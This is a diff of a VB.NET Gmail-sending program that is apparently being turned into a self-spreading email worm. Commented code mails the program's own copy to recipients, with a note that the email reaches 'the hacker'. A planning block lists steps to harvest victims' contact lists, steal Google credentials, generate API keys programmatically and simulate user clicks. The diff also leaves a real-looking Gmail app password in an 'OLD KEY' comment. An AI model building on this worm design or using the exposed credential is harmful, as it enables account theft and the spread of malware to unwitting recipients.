@@ -29,19 +29,23 @@ Public Class Form1
 
     Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
         Using mail As New MailMessage
-            mail.From = New MailAddress("userName111@gmail.com")
+            mail.From = New MailAddress("userName711@gmail.com")
             mail.To.Add(destination.Text$)
             mail.Body = Body.Text
 
-            ' Dim logs As New Attachment(copiedFile) 'can EMAIL Copied Self --- worm
-            ' mail.Attachments.Add(logs)
+            '------worm like behavior: more at bottom----
+            'can EMAIL Copied Self 
+            ' Dim logs As New Attachment(copiedFile) 
+            ' Email goes to reader, the hacker in this case.
+                
+            'mail.Attachments.Add(logs)
             mail.Subject = Subject.Text
             mail.Priority = mail.Priority.Normal
             Using SMTP As New SmtpClient
                 SMTP.EnableSsl = True
                 SMTP.Port = "587"
-                SMTP.Host = "smtp.gmail.com"
-                SMTP.Credentials = New Net.NetworkCredential("userName111", "sbkz lxnj yrnz cash") '//Remove the @gmail.com and CHANGE THIS to your user name and API KEY
+                SMTP.Host = "smtp.gmail.com" 
+                SMTP.Credentials = New Net.NetworkCredential("userName711", "aaaa bbbb cccc dddd") '//Remove the @gmail.com and CHANGE THIS to your user name and API KEY 'OLD KEYsbkz lxnj yrnz cash
                 SMTP.Send(mail)
 
             End Using
@@ -58,7 +62,7 @@ Public Class Form1
 
     Private Sub sendMail()
         Using mail As New MailMessage
-            mail.From = New MailAddress("userName111@gmail.com") 'CHANGE THIS to your user name
+            mail.From = New MailAddress("userName711@gmail.com") 'CHANGE THIS to your user name
             mail.To.Add(destination.Text$)
             mail.Body = Body.Text
 
@@ -70,7 +74,7 @@ Public Class Form1
                 SMTP.EnableSsl = True
                 SMTP.Port = "587"
                 SMTP.Host = "smtp.gmail.com"
-                SMTP.Credentials = New Net.NetworkCredential("userName111", "sbkz lxnj yrnz cash") 'CHANGE THIS to your user name and API KEY
+                SMTP.Credentials = New Net.NetworkCredential("userName711", "aaaa bbbb cccc dddd") 'CHANGE THIS to your user name and API KEY
                 '//Remove the @gmail.com after bobfarker
                 SMTP.Send(mail)
 
@@ -141,4 +145,24 @@ Public Class Form1
     Private Sub Button3_Click(sender As Object, e As EventArgs) Handles Button3.Click
         Timer1.Start()
     End Sub
+
+                    
+            '---------------Worm Requirements------------------
+            ' 1. email LIST of VICTIM
+            '    -GET THE LIST from Google if Gmail account is used, creditials stolen, or logged in
+            ' 2. A way to steal google creditials and set up api key(may not be possible or hard). BINGO
+            '    -----------Brick Wall: API KEY generation, retrieval, storage, and use.----------
+            '        storage handled by local file .txt of .cfg
+            '        use is handled by local file .txt of .cfg
+            '        generation and retrieval will be hard.
+            '
+            '    IDEAS: 
+            '    1. simulate user. Could have second screen of desktop log in and click, maybe hard for different screen sizes.
+            '    but would have to guess on where to click/type based on size of browser windows. If UI changes then it cant
+            '     adjust.
+                ' CLI, python scripts, outsource the generation and just retreive. etc
+            '    
+            '    Generation of API KEY programmatically.
+            '
+            '     retrieval of API KEY programmatically.
 End Class
